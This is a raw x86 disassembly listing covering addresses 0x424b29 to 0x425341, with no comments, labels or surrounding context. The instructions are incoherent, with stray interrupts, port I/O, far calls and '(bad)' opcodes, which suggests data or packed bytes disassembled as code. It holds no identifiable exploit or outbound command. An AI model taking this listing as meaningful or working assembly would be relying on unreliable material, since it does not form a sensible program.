  424b29:	xchg   BYTE PTR [edx-0x6047a019],al
  424b2f:	xchg   BYTE PTR ds:0x94060a,dh
  424b35:	add    BYTE PTR [eax],al
  424b37:	or     al,BYTE PTR [esi]
  424b39:	mov    esp,0xa000000
  424b3e:	jbe    0x424af0
  424b40:	or     dh,BYTE PTR [esi+0x15]
  424b43:	iret   
  424b44:	outs   dx,BYTE PTR ds:[esi]
  424b45:	std    
  424b46:	iret   
  424b47:	jno    0x424bb9
  424b49:	or     dh,BYTE PTR [esi+0x2d]
  424b4c:	or     dh,BYTE PTR [esi+0x35]
  424b4f:	leave  
  424b50:	push   es
  424b51:	jo     0x424b53
  424b53:	add    BYTE PTR [eax],al
  424b55:	sub    DWORD PTR [edi-0x30f5ca7a],ebx
  424b5b:	pushf  
  424b5c:	add    BYTE PTR [eax],al
  424b5e:	add    BYTE PTR [edx],cl
  424b60:	pop    ss
  424b61:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424b62:	add    BYTE PTR [eax],al
  424b64:	add    cl,cl
  424b66:	push   es
  424b67:	lods   al,BYTE PTR ds:[esi]
  424b68:	add    BYTE PTR [eax],al
  424b6a:	add    BYTE PTR [edx-0x61],cl
  424b6d:	xchg   BYTE PTR ds:0xb406c9,dh
  424b73:	add    BYTE PTR [eax],al
  424b75:	sbb    BYTE PTR [edi+0x6c93586],bl
  424b7b:	les    eax,FWORD PTR [eax]
  424b7d:	add    BYTE PTR [eax],al
  424b7f:	popa   
  424b80:	lahf   
  424b81:	xchg   BYTE PTR ds:0x9006c9,dh
  424b87:	add    BYTE PTR [eax],al
  424b89:	sbb    BYTE PTR [edi+0x6c93586],bl
  424b8f:	aam    0x0
  424b91:	add    BYTE PTR [eax],al
  424b93:	call   0xa77d237
  424b98:	iret   
  424b99:	fadd   QWORD PTR [eax]
  424b9b:	add    BYTE PTR [eax],al
  424b9d:	leave  
  424b9e:	push   es
  424b9f:	in     al,0x0
  424ba1:	add    BYTE PTR [eax],al
  424ba3:	mov    bl,BYTE PTR [edi-0x69f5ca7a]
  424ba9:	add    ecx,ecx
  424bab:	jbe    0x424bb2
  424bad:	and    bl,BYTE PTR [edi-0x72f5ca7a]
  424bb3:	or     ecx,ecx
  424bb5:	jbe    0x424b83
  424bb7:	inc    ecx
  424bb8:	lahf   
  424bb9:	xchg   BYTE PTR ds:0xc91d8d0a,dh
  424bbf:	jbe    0x424be6
  424bc1:	pusha  
  424bc2:	lahf   
  424bc3:	xchg   BYTE PTR ds:0x493d76c9,dh
  424bc9:	and    DWORD PTR [esi-0x3292c4cb],eax
  424bcf:	int3   
  424bd0:	push   es
  424bd1:	jo     0x424bd3
  424bd3:	add    BYTE PTR [eax],al
  424bd5:	shr    ebx,cl
  424bd7:	xchg   edx,eax
  424bd8:	add    DWORD PTR [edx],eax
  424bda:	scas   eax,DWORD PTR es:[edi]
  424bdb:	or     esp,ecx
  424bdd:	test   DWORD PTR [eax+eax*1+0x0],eax
  424be1:	add    BYTE PTR [esp+eax*1-0x7],ch
  424be5:	sbb    al,BYTE PTR [edx+0x1108cdb9]
  424beb:	add    DWORD PTR [eax+0x74cfcf80],0x71000000
  424bf5:	add    BYTE PTR [eax-0x7c],dh
  424bf8:	int    0xb3
  424bfa:	adc    DWORD PTR [ecx+0x17cf8080],eax
  424c00:	inc    esp
  424c01:	add    BYTE PTR [eax],al
  424c03:	add    BYTE PTR [edx+0x70],ah
  424c06:	add    BYTE PTR [ecx-0x78],dh
  424c09:	or     dh,BYTE PTR [esi+0x7d]
  424c0c:	iret   
  424c0d:	jbe    0x424bcc
  424c0f:	jo     0x424bde
  424c11:	or     BYTE PTR ds:0x808081,ah
  424c17:	push   eax
  424c18:	int    0x76
  424c1a:	jge    0x424c1c
  424c1c:	icebp  
  424c1d:	int    0x76
  424c1f:	std    
  424c20:	int    0x8d
  424c22:	std    
  424c23:	cmp    edi,DWORD PTR [ecx+0x4]
  424c26:	add    bh,bh
  424c28:	sar    DWORD PTR [ebp+0x28f2d392],cl
  424c2e:	push   ebx
  424c2f:	ror    DWORD PTR [edx],cl
  424c31:	jbe    0x424c40
  424c33:	int    0x8d
  424c35:	std    
  424c36:	int    0x76
  424c38:	std    
  424c39:	cmp    ecx,DWORD PTR [edi]
  424c3b:	add    al,0x11
  424c3d:	call   ebx
  424c3f:	lods   eax,DWORD PTR ds:[esi]
  424c40:	sub    bl,dl
  424c42:	jmp    0x424bd6
  424c44:	push   ebx
  424c45:	jge    0x424c14
  424c47:	jbe    0x424c06
  424c49:	inc    ebx
  424c4a:	rcl    esp,cl
  424c4c:	xchg   esi,eax
  424c4d:	or     dh,BYTE PTR [esi+0x75]
  424c50:	in     al,dx
  424c51:	das    
  424c52:	int    0x80
  424c54:	int    0x8d
  424c56:	jne    0x424c62
  424c58:	jbe    0x424c17
  424c5a:	int    0x76
  424c5c:	mov    ebp,0x4dd4d343
  424c61:	int    0x70
  424c63:	sbb    al,0xcd
  424c65:	mov    bl,0x25
  424c67:	add    DWORD PTR [eax-0x29cebc80],0x25b3cdb5
  424c71:	add    DWORD PTR [eax+0x1c70cd80],0x3ad63143
  424c7b:	int    0xb3
  424c7d:	sub    eax,0xcd808081
  424c82:	xchg   esi,eax
  424c83:	dec    esp
  424c84:	int    0x62
  424c86:	cmp    al,0x87
  424c88:	xor    DWORD PTR [edx],ecx
  424c8a:	jo     0x424cb0
  424c8c:	int    0x76
  424c8e:	stc    
  424c8f:	int    0x8d
  424c91:	stc    
  424c92:	cmp    edi,DWORD PTR [ecx+0x4]
  424c95:	add    bh,bh
  424c97:	sar    DWORD PTR [ebp+0x28f2d392],cl
  424c9d:	push   ebx
  424c9e:	ror    DWORD PTR [edx],cl
  424ca0:	jbe    0x424caf
  424ca2:	int    0x96
  424ca4:	and    al,0x9a
  424ca6:	pop    ebx
  424ca7:	mov    ebp,0xf5e2
  424cac:	push   es
  424cad:	ins    DWORD PTR es:[edi],dx
  424cae:	das    
  424caf:	add    eax,0x80808099
  424cb4:	add    dh,dl
  424cb6:	and    al,0xcd
  424cb8:	lock pop ebx
  424cba:	mov    ebp,0xf52c
  424cbf:	push   es
  424cc0:	ins    DWORD PTR es:[edi],dx
  424cc1:	das    
  424cc2:	add    eax,0x808080c5
  424cc7:	int    0x76
  424cc9:	and    al,0xcd
  424ccb:	lock int 0xd5
  424cce:	mov    ebp,0xfbe7
  424cd3:	push   es
  424cd4:	ins    DWORD PTR es:[edi],dx
  424cd5:	das    
  424cd6:	add    eax,0x808080d1
  424cdb:	call   0x0:0xf90ebd5b
  424ce2:	push   es
  424ce3:	ins    DWORD PTR es:[edi],dx
  424ce4:	das    
  424ce5:	add    eax,0x8080802d
  424cea:	int    0x8
  424cec:	and    eax,0x43808081
  424cf1:	sbb    al,0xd6
  424cf3:	sbb    cl,ch
  424cf5:	or     BYTE PTR [ecx],dl
  424cf7:	add    DWORD PTR [eax-0x52723080],0xadd60071
  424d01:	int    0x8d
  424d03:	dec    esp
  424d04:	add    BYTE PTR [ecx+0x70005b94],dl
  424d0a:	and    al,0xcd
  424d0c:	or     BYTE PTR [ebp-0x327f7f7f],bl
  424d12:	or     ch,0x7d
  424d15:	cmp    ecx,DWORD PTR [edi]
  424d17:	add    al,0x11
  424d19:	call   ebx
  424d1b:	jmp    0x424caf
  424d1d:	shr    DWORD PTR [ebp-0x2b82acd8],cl
  424d23:	(bad)
  424d27:	dec    ecx
  424d28:	and    BYTE PTR [esi-0x778932cb],al
  424d2e:	int    0x8d
  424d30:	mov    ch,cl
  424d32:	jbe    0x424d58
  424d34:	shr    ebx,cl
  424d36:	xchg   edx,eax
  424d37:	adc    al,BYTE PTR [edx]
  424d39:	scas   eax,DWORD PTR es:[edi]
  424d3a:	cmp    DWORD PTR [eax+0x7c89b880],eax
  424d40:	sbb    ch,cl
  424d42:	ins    BYTE PTR es:[edi],dx
  424d43:	cmp    al,0xcd
  424d45:	lea    ebp,[edi+eax*4]
  424d48:	lds    ecx,FWORD PTR [edx]
  424d4a:	outs   dx,BYTE PTR ds:[esi]
  424d4b:	adc    al,0xcd
  424d4d:	jbe    0x424d7b
  424d4f:	leave  
  424d50:	add    BYTE PTR [edi-0x327f7f80],0x76
  424d57:	sub    al,0xa
  424d59:	pushf  
  424d5a:	test   ch,cl
  424d5c:	jbe    0x424d8e
  424d5e:	int    0x8d
  424d60:	sub    al,0xa
  424d62:	outs   dx,BYTE PTR ds:[esi]
  424d63:	mov    ch,cl
  424d65:	jbe    0x424d7b
  424d67:	int    0x8d
  424d69:	sub    al,0xa
  424d6b:	outs   dx,BYTE PTR ds:[esi]
  424d6c:	dec    esp
  424d6d:	in     al,dx
  424d6e:	adc    al,0xcd
  424d70:	jbe    0x424d96
  424d72:	int    0x6c
  424d74:	cmp    al,0xcd
  424d76:	lea    ebp,[edi+eax*4]
  424d79:	lds    ecx,FWORD PTR [edx]
  424d7b:	outs   dx,BYTE PTR ds:[esi]
  424d7c:	adc    al,0xcd
  424d7e:	jbe    0x424dac
  424d80:	add    al,0x2c
  424d82:	or     cl,0x76
  424d85:	icebp  
  424d86:	add    DWORD PTR [eax-0x19fb7f80],0x92d680f1
  424d90:	cmp    ebx,ebp
  424d92:	int    0xc5
  424d94:	arpl   sp,bp
  424d96:	xchg   edx,eax
  424d97:	cmp    ebp,DWORD PTR [ebp-0x56]
  424d9a:	test   al,0xcb
  424d9c:	shl    BYTE PTR [eax+eax*4],cl
  424d9f:	xchg   esi,eax
  424da0:	int    0xed
  424da2:	jno    0x424e15
  424da4:	das    
  424da5:	mov    ebx,0x74cf146e
  424daa:	mov    BYTE PTR [edi+ebp*1],bl
  424dad:	mov    ebx,0x9a5b867e
  424db2:	leave  
  424db3:	jbe    0x424db2
  424db5:	dec    ecx
  424db6:	and    DWORD PTR [esi-0x672f5cb],eax
  424dbc:	push   es
  424dbd:	retf   
  424dbe:	aam    0xb4
  424dc0:	popa   
  424dc1:	shl    DWORD PTR [ecx],1
  424dc3:	xchg   BYTE PTR ds:0xcd4c7ccd,dh
  424dc9:	out    0x88,al
  424dcb:	xchg   edx,edi
  424dcd:	pop    esi
  424dce:	out    0x4c,al
  424dd0:	or     BYTE PTR [ebp-0x33],0xdc
  424dd4:	mov    BYTE PTR [edi-0x77197806],al
  424dda:	pop    esi
  424ddb:	out    0x4c,al
  424ddd:	cmp    BYTE PTR [edx-0x33],0x8d
  424de1:	std    
  424de2:	int    0xe6
  424de4:	std    
  424de5:	cmp    edx,DWORD PTR [ebx]
  424de7:	add    al,0xf8
  424de9:	call   ebx
  424deb:	jmp    0xd41e1b18
  424df0:	in     al,dx
  424df1:	xchg   edx,eax
  424df2:	push   ebx
  424df3:	cld    
  424df4:	add    al,0xf2
  424df6:	std    
  424df7:	add    al,0xd3
  424df9:	test   BYTE PTR [ebp*2+0x10d37a3c],al
  424e00:	sub    BYTE PTR [ebx-0x6],dl
  424e03:	adc    bh,al
  424e05:	dec    ecx
  424e06:	and    DWORD PTR [esi-0x2197ecb],eax
  424e0c:	int    0x8d
  424e0e:	std    
  424e0f:	int    0xe6
  424e11:	std    
  424e12:	cmp    edx,DWORD PTR [ebx]
  424e14:	add    al,0xf8
  424e16:	call   ebx
  424e18:	jmp    0x424dac
  424e1a:	shr    ecx,cl
  424e1c:	sub    BYTE PTR [ebx-0x10],dl
  424e1f:	inc    ebx
  424e20:	(bad)  
  424e21:	stc    
  424e22:	xor    BYTE PTR [ecx+0x63aa6d3b],0xcb
  424e29:	ror    BYTE PTR [eax-0x12326980],cl
  424e2f:	add    al,0xed
  424e31:	push   eax
  424e32:	leave  
  424e33:	jbe    0x424dda
  424e35:	mov    edx,0xc98080ac
  424e3a:	jbe    0x424df1
  424e3c:	xchg   eax,ecx
  424e3e:	add    BYTE PTR [eax-0x68528937],0x40
  424e45:	add    BYTE PTR [eax-0x51068937],0x30
  424e4c:	test   BYTE PTR [eax-0x4a028937],al
  424e52:	lods   al,BYTE PTR ds:[esi]
  424e53:	add    BYTE PTR [eax+0x69f176c9],0x53
  424e5a:	add    BYTE PTR [eax-0x76a8937],0x42
  424e61:	add    BYTE PTR [eax-0x78628937],0x80
  424e68:	add    BYTE PTR [eax-0x2c428937],0xb8
  424e6f:	add    BYTE PTR [eax-0x32128937],0x71
  424e76:	add    BYTE PTR [eax-0x1dee8937],0xb6
  424e7d:	add    BYTE PTR [eax+0x5dfd8dcd],0x8b
  424e84:	mov    al,BYTE PTR [eax-0x322ccc80]
  424e8a:	(bad)  
  424e8b:	stc    
  424e8c:	cmp    ebx,edx
  424e8e:	clc    
  424e8f:	add    bl,BYTE PTR [eax+0x127dcd9a]
  424e95:	repnz popa 
  424e97:	and    al,BYTE PTR [eax-0x7a34ed80]
  424e9d:	mov    BYTE PTR [eax+0x42021280],0xa4
  424ea4:	add    BYTE PTR [eax+0x3cded312],0x80
  424eab:	or     cl,0x76
  424eae:	cmc    
  424eaf:	icebp  
  424eb0:	lea    eax,[eax-0x2893680]
  424eb6:	jnp    0x424e8c
  424eb8:	add    BYTE PTR [eax+0x18f976c9],0x30
  424ebf:	add    BYTE PTR [eax-0x32068933],0x96
  424ec6:	std    
  424ec7:	ss dec eax
  424ec9:	pushf  
  424eca:	add    BYTE PTR [eax+0x7687d23b],0xf5
  424ed1:	int    0xe3
  424ed3:	push   esi
  424ed4:	jp     0x424ed5
  424ed6:	add    BYTE PTR [eax-0x69f50ecd],0xfd
  424edd:	int    0x76
  424edf:	std    
  424ee0:	xchg   DWORD PTR [esi-0x78],esi
  424ee3:	int    0x96
  424ee5:	std    
  424ee6:	xchg   DWORD PTR [esi+0x922ca4c],edx
  424eec:	xor    ch,cl
  424eee:	jbe    0x424f01
  424ef0:	int    0x96
  424ef2:	in     eax,dx
  424ef3:	sbb    BYTE PTR ss:[edi-0x80],cl
  424ef7:	cmp    BYTE PTR [ebx],0xd2
  424efa:	int    0x96
  424efc:	mov    ebp,0xe261d253
  424f01:	fadd   DWORD PTR [eax-0x320ecc80]
  424f07:	jbe    0x424ebe
  424f09:	xchg   DWORD PTR [ebx],edx
  424f0b:	popa   
  424f0c:	fist   WORD PTR [eax+eax*4-0x80]
  424f10:	xor    esi,ecx
  424f12:	xchg   DWORD PTR [esi-0x5a893253],edx
  424f18:	int    0xd6
  424f1a:	xor    ch,cl
  424f1c:	out    0x9d,al
  424f1e:	adc    bh,bl
  424f20:	mov    DWORD PTR [ecx-0x80],esi
  424f23:	sub    BYTE PTR [ebx],0xf1
  424f26:	int    0x76
  424f28:	xchg   ebp,eax
  424f29:	adc    bh,bl
  424f2b:	mov    dh,0x2c
  424f2d:	add    BYTE PTR [eax-0x25c404cd],0xf8
  424f34:	clc    
  424f35:	int    0x96
  424f37:	icebp  
  424f38:	push   esi
  424f39:	out    0x1e,al
  424f3b:	add    BYTE PTR [eax-0x1c322dd5],0x33
  424f42:	icebp  
  424f43:	adc    dh,bl
  424f45:	pop    es
  424f46:	push   edx
  424f47:	add    BYTE PTR [eax+0x72f9943],0x63
  424f4e:	add    BYTE PTR [eax],al
  424f50:	add    BYTE PTR [edx+0x4cd2cba8],ch
  424f56:	adc    BYTE PTR [esi-0x12fb1233],0x74
  424f5d:	pop    ebx
  424f5e:	cwde   
  424f5f:	call   0x8043:0xd9ed76c9
  424f66:	or     cl,0x76
  424f69:	adc    DWORD PTR [edx+0x7e],esi
  424f6c:	add    BYTE PTR [eax+0x5ff576c9],0x71
  424f73:	add    BYTE PTR [eax+0xbf976c9],0x71
  424f7a:	add    BYTE PTR [eax+0x29fd76c9],0x2c
  424f81:	add    BYTE PTR [eax-0x275a8937],0x58
  424f88:	add    BYTE PTR [eax+0x76ad76c9],0x84
  424f8f:	add    BYTE PTR [eax+0x6cb576c9],0x8c
  424f96:	add    BYTE PTR [eax+0x1abd76c9],0x5e
  424f9d:	add    BYTE PTR [eax-0x449a8937],0x6f
  424fa4:	add    BYTE PTR [eax+0x4a6d76c9],0x80
  424fab:	add    BYTE PTR [eax+0x4d7576c9],0x38
  424fb2:	add    BYTE PTR [eax+0x1f7d76c9],0x28
  424fb9:	add    BYTE PTR [eax-0x44f28937],0x4d
  424fc0:	add    BYTE PTR [eax-0x1b0e8937],0x1c
  424fc7:	add    BYTE PTR [eax-0x32528933],0x8d
  424fce:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424fcf:	dec    ebp
  424fd0:	bound  ebp,QWORD PTR [ebx]
  424fd2:	add    BYTE PTR [eax-0x7f59c2ba],0x80
  424fd9:	dec    ebp
  424fda:	pop    ds
  424fdb:	and    eax,DWORD PTR [eax-0x2c2ed080]
  424fe1:	pop    edi
  424fe2:	xchg   ecx,eax
  424fe3:	mov    bh,0x7e
  424fe5:	stc    
  424fe6:	xor    edi,DWORD PTR [ebp-0x33]
  424fe9:	jbe    0x424fe8
  424feb:	int    0x96
  424fed:	stc    
  424fee:	sub    edx,edx
  424ff0:	int    0x96
  424ff2:	cmc    
  424ff3:	dec    ebp
  424ff4:	inc    edi
  424ff5:	outs   dx,DWORD PTR ds:[esi]
  424ff6:	add    BYTE PTR [eax-0x69322dcd],0x11
  424ffd:	xor    edx,edx
  424fff:	int    0x96
  425001:	in     eax,dx
  425002:	push   ebx
  425003:	sar    BYTE PTR [ebx],cl
  425005:	fisubr DWORD PTR [ecx-0x27]
  425008:	ret    
  425009:	add    BYTE PTR [eax],al
  42500b:	clc    
  42500c:	test   ebp,0x72c34c96
  425012:	push   ds
  425013:	add    BYTE PTR [eax+0x76cdf133],0xbd
  42501a:	int    0xd6
  42501c:	mov    ch,0x33
  42501e:	leave  
  42501f:	das    
  425020:	sar    DWORD PTR [ecx+0x69],1
  425023:	fisttp DWORD PTR [edx]
  425025:	xchg   ecx,eax
  425026:	mov    ebx,ebp
  425028:	popa   
  425029:	add    BYTE PTR [eax-0x6a893680],0x9b
  425030:	push   esp
  425031:	add    BYTE PTR [eax+0x2d9d76c9],0x6f
  425038:	add    BYTE PTR [eax+0x1ad76c9],0xa4
  42503f:	add    BYTE PTR [eax-0x7e5a8937],0x80
  425046:	add    BYTE PTR [eax+0x3ba5a6cd],0xda
  42504d:	pop    ebp
  42504e:	call   0xcdf4:0xf880806f
  425055:	xchg   esi,eax
  425056:	lods   eax,DWORD PTR ds:[esi]
  425057:	int    0xa6
  425059:	mov    BYTE PTR [ebx-0x2e],dl
  42505c:	int    0x96
  42505e:	popf   
  42505f:	xor    edx,edx
  425061:	int    0x96
  425063:	xchg   ebp,eax
  425064:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  425066:	push   eax
  425067:	add    BYTE PTR [eax-0x302d2ed1],0x5
  42506e:	mov    BYTE PTR [eax+0x2c],bl
  425071:	ret    0xafd
  425074:	jbe    0x42500b
  425076:	int    0x76
  425078:	icebp  
  425079:	int    0x96
  42507b:	or     eax,0xf3f7f534
  425080:	int    0x96
  425082:	xchg   ebp,eax
  425083:	xor    al,0x23
  425085:	inc    esp
  425086:	test   DWORD PTR [ebp+edx*8-0x7c],ecx
  42508a:	inc    esi
  42508b:	or     DWORD PTR [eax+eiz*1+0x4d7d76cd],eax
  425092:	rol    esi,0x80
  425095:	add    BYTE PTR [edi-0x59328a8a],0x6d
  42509c:	cmp    ebx,edx
  42509e:	clc    
  42509f:	hlt    
  4250a0:	int    0x96
  4250a2:	gs mov edi,0xc3d9
  4250a8:	ss aaa 
  4250aa:	push   esi
  4250ab:	add    BYTE PTR [eax+0xc56d233],0x6d
  4250b2:	add    BYTE PTR [eax],al
  4250b4:	xchg   DWORD PTR [ebp-0x33],edi
  4250b7:	jbe    0x4250b6
  4250b9:	int    0x96
  4250bb:	stc    
  4250bc:	sub    edx,edx
  4250be:	int    0x96
  4250c0:	cmc    
  4250c1:	dec    ebp
  4250c2:	inc    edi
  4250c3:	outs   dx,DWORD PTR ds:[esi]
  4250c4:	add    BYTE PTR [eax-0x69322dcd],0x11
  4250cb:	xor    edx,edx
  4250cd:	int    0x96
  4250cf:	in     eax,dx
  4250d0:	push   ebx
  4250d1:	sar    BYTE PTR [ebx],cl
  4250d3:	(bad)  
  4250d5:	hlt    
  4250d6:	int    0x96
  4250d8:	dec    esp
  4250d9:	xor    esi,ecx
  4250db:	int    0x76
  4250dd:	mov    ebp,0x33b5a6cd
  4250e2:	leave  
  4250e3:	das    
  4250e4:	rol    ebp,1
  4250e6:	int    0xdb
  4250e8:	xor    ebx,DWORD PTR [ebp-0x1dbc5679]
  4250ee:	das    
  4250ef:	pop    es
  4250f0:	pop    esp
  4250f1:	add    BYTE PTR [eax],al
  4250f3:	add    BYTE PTR [edx-0x2d349c58],ch
  4250f9:	mov    BYTE PTR [eax+0x4edcd96],al
  4250ff:	in     eax,dx
  425100:	jo     0x4250cb
  425102:	jbe    0x4250d4
  425104:	xchg   ecx,eax
  425105:	aaa    
  425106:	ficom  WORD PTR [ebx]
  425108:	pop    ebp
  425109:	mov    ebp,0xa25230a
  42510e:	jbe    0x425165
  425110:	leave  
  425111:	jbe    0x425170
  425113:	mov    esi,0xa13de37
  425118:	jbe    0x42517f
  42511a:	leave  
  42511b:	jbe    0x42518a
  42511d:	fidiv  WORD PTR [edi]
  42511f:	ficom  WORD PTR [ebx]
  425121:	or     dh,BYTE PTR [esi+0x75]
  425124:	pop    ebx
  425125:	leave  
  425126:	jbe    0x4251a5
  425128:	scas   al,BYTE PTR es:[edi]
  425129:	aaa    
  42512a:	ficom  WORD PTR [ebx]
  42512c:	or     dh,BYTE PTR [esi+0xd]
  42512f:	cwde   
  425130:	call   0xde37:0x96f176c9
  425137:	adc    ecx,DWORD PTR [edx]
  425139:	jbe    0x4250d0
  42513b:	cmp    ebx,edx
  42513d:	cmp    eax,DWORD PTR [eax]
  42513f:	pop    edi
  425140:	dec    ecx
  425141:	and    DWORD PTR [esi-0x628936cb],eax
  425147:	out    0x37,al
  425149:	ficom  WORD PTR [ebx]
  42514b:	jp     0x425157
  42514d:	jbe    0x4250f4
  42514f:	int    0xd3
  425151:	or     dl,BYTE PTR [esi-0x4a19f513]
  425157:	iret   
  425158:	xchg   ecx,eax
  425159:	add    DWORD PTR [ecx+edx*1],0x28add3ff
  425160:	push   ebx
  425161:	ror    bh,cl
  425163:	je     0x42512c
  425165:	ror    ch,1
  425167:	xor    ch,cl
  425169:	pushf  
  42516a:	test   BYTE PTR [edi],ch
  42516c:	inc    ebp
  42516d:	loop   0x425101
  42516f:	shr    esp,cl
  425171:	xchg   edx,eax
  425172:	int    0x1c
  425174:	int    0x6c
  425176:	test   BYTE PTR [ebx],bh
  425178:	ins    DWORD PTR es:[edi],dx
  425179:	adc    bh,bl
  42517b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42517c:	mov    esi,0xf1534229
  425181:	or     dl,BYTE PTR [esi-0x6893207]
  425187:	xchg   DWORD PTR [ebp-0x2d],ebp
  42518a:	in     eax,0x28
  42518c:	inc    ebx
  42518d:	jbe    0x4251db
  42518f:	das    
  425190:	or     BYTE PTR [edi-0x327f7f80],bh
  425196:	jbe    0x425191
  425198:	add    al,0xb6
  42519a:	mov    ebp,0x11e60a80
  42519f:	int    0x76
  4251a1:	stc    
  4251a2:	push   es
  4251a3:	ins    DWORD PTR es:[edi],dx
  4251a4:	aam    0xb6
  4251a6:	cmp    ebp,DWORD PTR [ebp+0xa]
  4251a9:	out    0xf5,al
  4251ab:	int    0x96
  4251ad:	mov    ebp,0xcf88a6cd
  4251b2:	fs xor ch,cl
  4251b5:	xchg   esi,eax
  4251b6:	mov    BYTE PTR [edi-0x5269f527],al
  4251bc:	retf   0x922
  4251bf:	xchg   esi,eax
  4251c0:	add    ch,cl
  4251c2:	xchg   esi,eax
  4251c3:	stc    
  4251c4:	xchg   ecx,ebx
  4251c6:	retf   0x2014
  4251c9:	int    0xa6
  4251cb:	lods   eax,DWORD PTR ds:[esi]
  4251cc:	or     DWORD PTR [ebx],ebx
  4251ce:	retf   0x96
  4251d1:	int    0xa6
  4251d3:	stc    
  4251d4:	xchg   ecx,esp
  4251d6:	int    0xe6
  4251d8:	mov    BYTE PTR [ecx],cl
  4251da:	adc    al,0x43
  4251dc:	int    0x96
  4251de:	cmc    
  4251df:	ins    BYTE PTR es:[edi],dx
  4251e0:	add    al,0xea
  4251e2:	std    
  4251e3:	sar    DWORD PTR [ebp-0x7b2dfbd8],cl
  4251e9:	push   ebx
  4251ea:	sar    BYTE PTR [ebx],cl
  4251ec:	ror    DWORD PTR [edx],cl
  4251ee:	jbe    0x4251e5
  4251f0:	push   ecx
  4251f1:	(bad)  
  4251f2:	cmc    
  4251f3:	int    0x96
  4251f5:	cmc    
  4251f6:	add    al,0x11
  4251f8:	call   ebx
  4251fa:	repz xchg edx,eax
  4251fc:	shr    DWORD PTR [ebp-0x322dacd8],cl
  425202:	xchg   esi,eax
  425203:	stc    
  425204:	inc    ebx
  425205:	rol    BYTE PTR [edx+0x7a003ba7],cl
  42520b:	int    0x76
  42520d:	adc    ebp,ecx
  42520f:	xchg   esi,eax
  425210:	stc    
  425211:	int    0xa6
  425213:	mov    ebp,0xcffdad04
  425218:	test   cl,dh
  42521a:	int    0x96
  42521c:	stc    
  42521d:	iret   
  42521e:	adc    al,0x5b
  425220:	int    0xa6
  425222:	dec    esp
  425223:	shl    ebx,cl
  425225:	sub    BYTE PTR [ebx-0x2e],dl
  425228:	cmp    edx,ebx
  42522a:	or     dh,BYTE PTR [esi+0x11]
  42522d:	push   ecx
  42522e:	(bad)  
  42522f:	adc    ebp,ecx
  425231:	xchg   esi,eax
  425232:	adc    DWORD PTR [ecx+edx*1],eax
  425235:	call   ebx
  425237:	repz xchg edx,eax
  425239:	shr    DWORD PTR [ebp-0x322dacd8],cl
  42523f:	xchg   esi,eax
  425240:	stc    
  425241:	xchg   edx,ebx
  425243:	xor    esp,edx
  425245:	or     dh,BYTE PTR [esi-0x43]
  425248:	inc    ebx
  425249:	lds    ebp,FWORD PTR [edi]
  42524b:	pop    es
  42524c:	outs   dx,DWORD PTR ds:[esi]
  42524d:	add    BYTE PTR [eax],al
  42524f:	add    ch,cl
  425251:	jbe    0x425240
  425253:	int    0x96
  425255:	mov    ch,0x4
  425257:	jmp    0xd384:0xd2046cfd
  42525e:	mov    ebp,0x3bd25328
  425263:	ror    ebp,cl
  425265:	popf   
  425266:	int    0xf1
  425268:	cmp    ebx,DWORD PTR [ecx-0x2c000bfc]
  42526e:	in     eax,0x28
  425270:	or     dl,BYTE PTR [esi-0x6d0c2c4b]
  425276:	or     ah,BYTE PTR [esi-0x12697613]
  42527c:	add    al,0xe6
  42527e:	in     eax,dx
  42527f:	xchg   BYTE PTR [edi],ch
  425281:	or     edx,DWORD PTR [ebp-0x55ffff01]
  425287:	test   al,0x63
  425289:	retf   
  42528a:	ror    BYTE PTR [eax-0x12326980],cl
  425290:	add    al,0xed
  425292:	adc    al,0xcd
  425294:	jbe    0x42521e
  425296:	leave  
  425297:	jbe    0x4252aa
  425299:	dec    ecx
  42529a:	and    DWORD PTR [esi-0x28936cb],eax
  4252a0:	inc    ecx
  4252a1:	and    DWORD PTR [esi+0x5b80cd35],eax
  4252a7:	cwde   
  4252a8:	or     dh,BYTE PTR [esi-0x7]
  4252ab:	leave  
  4252ac:	jbe    0x4252a3
  4252ae:	into   
  4252af:	and    DWORD PTR [esi+0x76c99a35],eax
  4252b5:	in     eax,dx
  4252b6:	inc    esi
  4252b7:	sbb    DWORD PTR [ebp-0x22932de],esi
  4252bd:	int    0x8d
  4252bf:	std    
  4252c0:	sar    bh,0x5d
  4252c3:	shl    DWORD PTR [ecx],1
  4252c5:	xchg   BYTE PTR ds:0xd3f03baa,dh
  4252cb:	repnz sub BYTE PTR [ebx],bh
  4252ce:	adc    ebx,edx
  4252d0:	out    dx,eax
  4252d1:	xchg   edx,eax
  4252d2:	push   ebx
  4252d3:	add    cl,ch
  4252d5:	lea    edx,[ecx]
  4252d7:	int    0x96
  4252d9:	adc    DWORD PTR [ebx],edi
  4252db:	jge    0x425318
  4252dd:	(bad)  
  4252df:	jmp    0x425273
  4252e1:	shr    edx,cl
  4252e3:	sub    BYTE PTR [ebx+0x13],dl
  4252e6:	das    
  4252e7:	rol    DWORD PTR [edx],1
  4252e9:	jmp    0x42528a
  4252eb:	add    BYTE PTR [eax-0x6723280],0xcd
  4252f2:	xchg   esi,eax
  4252f3:	stc    
  4252f4:	cmp    ebx,ecx
  4252f6:	shr    edx,cl
  4252f8:	sub    BYTE PTR [ebx],bh
  4252fa:	jge    0x4252cf
  4252fc:	jmp    0x425290
  4252fe:	push   ebx
  4252ff:	adc    ecx,ebp
  425301:	xchg   esi,eax
  425302:	std    
  425303:	int    0xa6
  425305:	std    
  425306:	cmp    esi,ecx
  425308:	cmp    esp,ecx
  42530a:	shl    ebx,cl
  42530c:	xchg   edx,eax
  42530d:	shl    ebp,cl
  42530f:	sub    BYTE PTR [ebx-0x2b],dl
  425312:	push   es
  425313:	adc    ecx,ebp
  425315:	xchg   esi,eax
  425316:	stc    
  425317:	int    0x8d
  425319:	stc    
  42531a:	aam    0x58
  42531c:	cmp    esi,eax
  42531e:	shl    edx,cl
  425320:	sub    BYTE PTR [ebx],bh
  425322:	icebp  
  425323:	shl    ebx,cl
  425325:	xchg   edx,eax
  425326:	push   ebx
  425327:	jecxz  0x4252f6
  425329:	(bad)  
  42532a:	std    
  42532b:	int    0xa6
  42532d:	std    
  42532e:	cmp    edi,DWORD PTR [ebp+0x3b]
  425331:	loope  0x425306
  425333:	jmp    0x4252c7
  425335:	shl    ebp,cl
  425337:	sub    BYTE PTR [ebx+0xc],dl
  42533a:	aad    0xf3
  42533c:	int    0x8d
  42533e:	in     eax,dx
  42533f:	int    0xa6
  425341:	in     eax,dx
